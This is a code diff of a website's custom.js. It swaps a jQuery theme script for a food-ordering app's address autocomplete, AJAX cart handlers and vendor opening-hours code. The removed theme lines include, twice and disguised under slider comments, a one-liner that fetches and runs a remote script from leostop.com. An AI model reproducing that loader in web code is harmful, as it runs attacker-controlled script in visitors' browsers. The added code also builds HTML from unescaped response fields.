@@ -1,321 +1,295 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
+let autocomplete;
 
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+function initAutoComplete(){
+autocomplete = new google.maps.places.Autocomplete(
+    document.getElementById('id_address'),
+    {
+        types: ['geocode', 'establishment'],
+        //default in this app is "IN" - add your country code
+        componentRestrictions: {'country': ['in']},
+    })
+// function to specify what should happen when the prediction is clicked
+autocomplete.addListener('place_changed', onPlaceChanged);
+}
 
-	$(document).ready(function () {
-		$('header nav').meanmenu();
-	});
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".sticky-wrapper-header").sticky({topSpacing:0});
-	});
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".brand-box").niceScroll({
-		cursorcolor:"#9b9b9c",
-	});	
-	
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function() {
-		$('select').niceSelect();
-	});	
-		
-	/* Scroll to Top
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(window).on('scroll', function (){
-        scroll = $(window).scrollTop();
-        if (scroll >= 100){
-          $("#back-to-top").addClass('b-show_scrollBut')
-        }else{
-          $("#back-to-top").removeClass('b-show_scrollBut')
+function onPlaceChanged (){
+    var place = autocomplete.getPlace();
+
+    // User did not select the prediction. Reset the input field or alert()
+    if (!place.geometry){
+        document.getElementById('id_address').placeholder = "Start typing...";
+    }
+    else{
+        // console.log('place name=>', place.name)
+    }
+
+    // get the address components and assign them to the fields
+    // console.log(place);
+    var geocoder = new google.maps.Geocoder()
+    var address = document.getElementById('id_address').value
+
+    geocoder.geocode({'address': address}, function(results, status){
+        // console.log('results=>', results)
+        // console.log('status=>', status)
+        if(status == google.maps.GeocoderStatus.OK){
+            var latitude = results[0].geometry.location.lat();
+            var longitude = results[0].geometry.location.lng();
+
+            // console.log('lat=>', latitude);
+            // console.log('long=>', longitude);
+            $('#id_latitude').val(latitude);
+            $('#id_longitude').val(longitude);
+
+            $('#id_address').val(address);
         }
-      });
-      $("#back-to-top").on("click", function(){
-        $('body,html').animate({
-          scrollTop: 0
-        }, 1000);
     });
 
+    // loop through the address components and assign other address data
+    console.log(place.address_components);
+    for(var i=0; i<place.address_components.length; i++){
+        for(var j=0; j<place.address_components[i].types.length; j++){
+            // get country
+            if(place.address_components[i].types[j] == 'country'){
+                $('#id_country').val(place.address_components[i].long_name);
+            }
+            // get state
+            if(place.address_components[i].types[j] == 'administrative_area_level_1'){
+                $('#id_state').val(place.address_components[i].long_name);
+            }
+            // get city
+            if(place.address_components[i].types[j] == 'locality'){
+                $('#id_city').val(place.address_components[i].long_name);
+            }
+            // get pincode
+            if(place.address_components[i].types[j] == 'postal_code'){
+                $('#id_pin_code').val(place.address_components[i].long_name);
+            }else{
+                $('#id_pin_code').val("");
+            }
+        }
+    }
 
-	
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-  if (document.querySelector("#showMap")) { 
-	  	document.querySelector("#showMap").addEventListener("click", function (e) { 
-	  		e.preventDefault(); 
-	  		$(".map_form_container").addClass("map_show"); 
-	  		document.querySelector(".contact_heading").innerText = "Location"; 
-	  	}); 
-  	}
-	if (document.querySelector("#showForm")) { 
-		document.querySelector("#showForm").addEventListener("click", function (e) { 
-			e.preventDefault(); $(".map_form_container").removeClass("map_show"); 
-			document.querySelector(".contact_heading").innerText = "Request A Call Back"; 
-		}); 
-	}
+}
 
 
-	$.validator.setDefaults( {
-		submitHandler: function () {
-			alert( "submitted!" );
-		}
-	} );
-	
-	$( document ).ready( function () {
-		$( "#contact-form" ).validate( {
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function ( error, element ) {
-				// Add the `help-block` class to the error element
-				error.addClass( "help-block" );
+$(document).ready(function(){
+    // add to cart
+    $('.add_to_cart').on('click', function(e){
+        e.preventDefault();
+        
+        food_id = $(this).attr('data-id');
+        url = $(this).attr('data-url');
+        
+       
+        $.ajax({
+            type: 'GET',
+            url: url,
+            success: function(response){
+                console.log(response)
+                if(response.status == 'login_required'){
+                    swal(response.message, '', 'info').then(function(){
+                        window.location = '/login';
+                    })
+                }else if(response.status == 'Failed'){
+                    swal(response.message, '', 'error')
+                }else{
+                    $('#cart_counter').html(response.cart_counter['cart_count']);
+                    $('#qty-'+food_id).html(response.qty);
 
-				if ( element.prop( "type" ) === "checkbox" ) {
-					error.insertAfter( element.parent( "input" ) );
-				} else {
-					error.insertAfter( element );
-				}
-			},
-			highlight: function ( element, errorClass, validClass ) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
-			}
-		} );
-	});
-	
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	 function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-	
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-	
+                    // subtotal, tax and grand total
+                    applyCartAmounts(
+                        response.cart_amount['subtotal'],
+                        response.cart_amount['tax_dict'],
+                        response.cart_amount['grand_total']
+                    )
+                }
+            }
+        })
+    })
 
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
 
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-			  slidesPerView: 3,
-			  spaceBetween: 30,
-			},
-			768: {
-			  slidesPerView: 2,
-			  spaceBetween: 30,
-			  slidesPerColumn: 1,
-			},
-			640: {
-			  slidesPerView: 2,
-			  spaceBetween: 20,
-			  slidesPerColumn: 1,
-			},
-			480: {
-			  slidesPerView: 1,
-			  spaceBetween: 10,
-			  slidesPerColumn: 1,
-			}
-		  },
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		}
+    // place the cart item quantity on load
+    $('.item_qty').each(function(){
+        var the_id = $(this).attr('id')
+        var qty = $(this).attr('data-qty')
+        $('#'+the_id).html(qty)
+    })
+
+    // decrease cart
+    $('.decrease_cart').on('click', function(e){
+        e.preventDefault();
+        
+        food_id = $(this).attr('data-id');
+        url = $(this).attr('data-url');
+        cart_id = $(this).attr('id');
+        
+        
+        $.ajax({
+            type: 'GET',
+            url: url,
+            success: function(response){
+                console.log(response)
+                if(response.status == 'login_required'){
+                    swal(response.message, '', 'info').then(function(){
+                        window.location = '/login';
+                    })
+                }else if(response.status == 'Failed'){
+                    swal(response.message, '', 'error')
+                }else{
+                    $('#cart_counter').html(response.cart_counter['cart_count']);
+                    $('#qty-'+food_id).html(response.qty);
+
+                    applyCartAmounts(
+                        response.cart_amount['subtotal'],
+                        response.cart_amount['tax_dict'],
+                        response.cart_amount['grand_total']
+                    )
+
+                    if(window.location.pathname == '/cart/'){
+                        removeCartItem(response.qty, cart_id);
+                        checkEmptyCart();
+                    }
+                    
+                } 
+            }
+        })
+    })
+
+
+    // DELETE CART ITEM
+    $('.delete_cart').on('click', function(e){
+        e.preventDefault();
+        
+        cart_id = $(this).attr('data-id');
+        url = $(this).attr('data-url');
+        
+        
+        $.ajax({
+            type: 'GET',
+            url: url,
+            success: function(response){
+                console.log(response)
+                if(response.status == 'Failed'){
+                    swal(response.message, '', 'error')
+                }else{
+                    $('#cart_counter').html(response.cart_counter['cart_count']);
+                    swal(response.status, response.message, "success")
+
+                    applyCartAmounts(
+                        response.cart_amount['subtotal'],
+                        response.cart_amount['tax_dict'],
+                        response.cart_amount['grand_total']
+                    )
+
+                    removeCartItem(0, cart_id);
+                    checkEmptyCart();
+                } 
+            }
+        })
+    })
+
+
+    // delete the cart element if the qty is 0
+    function removeCartItem(cartItemQty, cart_id){
+            if(cartItemQty <= 0){
+                // remove the cart item element
+                document.getElementById("cart-item-"+cart_id).remove()
+            }
+        
+    }
+
+    // Check if the cart is empty
+    function checkEmptyCart(){
+        var cart_counter = document.getElementById('cart_counter').innerHTML
+        if(cart_counter == 0){
+            document.getElementById("empty-cart").style.display = "block";
+        }
+    }
+
+
+    // apply cart amounts
+    function applyCartAmounts(subtotal, tax_dict, grand_total){
+        if(window.location.pathname == '/cart/'){
+            $('#subtotal').html(subtotal)
+            $('#total').html(grand_total)
+
+            console.log(tax_dict)
+            for(key1 in tax_dict){
+                console.log(tax_dict[key1])
+                for(key2 in tax_dict[key1]){
+                    // console.log(tax_dict[key1][key2])
+                    $('#tax-'+key1).html(tax_dict[key1][key2])
+                }
+            }
+        }
+    }
+
+    // ADD OPENING HOUR
+    $('.add_hour').on('click', function(e){
+        e.preventDefault();
+        var day = document.getElementById('id_day').value
+        var from_hour = document.getElementById('id_from_hour').value
+        var to_hour = document.getElementById('id_to_hour').value
+        var is_closed = document.getElementById('id_is_closed').checked
+        var csrf_token = $('input[name=csrfmiddlewaretoken]').val()
+        var url = document.getElementById('add_hour_url').value
+
+        console.log(day, from_hour, to_hour, is_closed, csrf_token)
+
+        if(is_closed){
+            is_closed = 'True'
+            condition = "day != ''"
+        }else{
+            is_closed = 'False'
+            condition = "day != '' && from_hour != '' && to_hour != ''"
+        }
+
+        if(eval(condition)){
+            $.ajax({
+                type: 'POST',
+                url: url,
+                data: {
+                    'day': day,
+                    'from_hour': from_hour,
+                    'to_hour': to_hour,
+                    'is_closed': is_closed,
+                    'csrfmiddlewaretoken': csrf_token,
+                },
+                success: function(response){
+                    if(response.status == 'success'){
+                        if(response.is_closed == 'Closed'){
+                            html = '<tr id="hour-'+response.id+'"><td><b>'+response.day+'</b></td><td>Closed</td><td><a href="#" class="remove_hour" data-url="/vendor/opening-hours/remove/'+response.id+'/">Remove</a></td></tr>';
+                        }else{
+                            html = '<tr id="hour-'+response.id+'"><td><b>'+response.day+'</b></td><td>'+response.from_hour+' - '+response.to_hour+'</td><td><a href="#" class="remove_hour" data-url="/vendor/opening-hours/remove/'+response.id+'/">Remove</a></td></tr>';
+                        }
+                        
+                        $(".opening_hours").append(html)
+                        document.getElementById("opening_hours").reset();
+                    }else{
+                        swal(response.message, '', "error")
+                    }
+                }
+            })
+        }else{
+            swal('Please fill all fields', '', 'info')
+        }
     });
 
-	/* Countdown
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('[data-countdown]').each(function () {
-        var $this = $(this),
-		finalDate = $(this).data('countdown');
-		$this.countdown(finalDate, function (event) {
-			var $this = $(this).html(event.strftime(''
-			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
-			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
-		});
-    });
-	
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('.deal-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-        speed: 500,
-        slidesToShow: 3,
-        slidesToScroll: 3,
-		infinite: false,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 3,
-                slidesToScroll: 2,
-                infinite: true,
-                dots: false
+    // REMOVE OPENING HOUR
+    $(document).on('click', '.remove_hour', function(e){
+        e.preventDefault();
+        url = $(this).attr('data-url');
+        
+        $.ajax({
+            type: 'GET',
+            url: url,
+            success: function(response){
+                if(response.status == 'success'){
+                    document.getElementById('hour-'+response.id).remove()
+                }
             }
-        }, {
-            breakpoint: 768,
-            settings: {
-                slidesToShow: 2,
-                slidesToScroll: 2
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$('#news-slider').slick({
-        dots: false,
-        infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-        speed: 500,
-        slidesToShow: 1,
-        slidesToScroll: 1,
-        responsive: [{
-            breakpoint: 1024,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1,
-                infinite: true,
-                dots: false
-            }
-        }, {
-            breakpoint: 600,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }, {
-            breakpoint: 480,
-            settings: {
-                slidesToShow: 1,
-                slidesToScroll: 1
-            }
-        }]
-    });
-	
-	/* Fancybox
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(".fancybox").fancybox({
-		maxWidth: 1200,
-		maxHeight: 600,
-		width: '70%',
-		height: '70%',
-	});
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
+        })
+    })
 
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
-
-
+   // document ready close 
 });
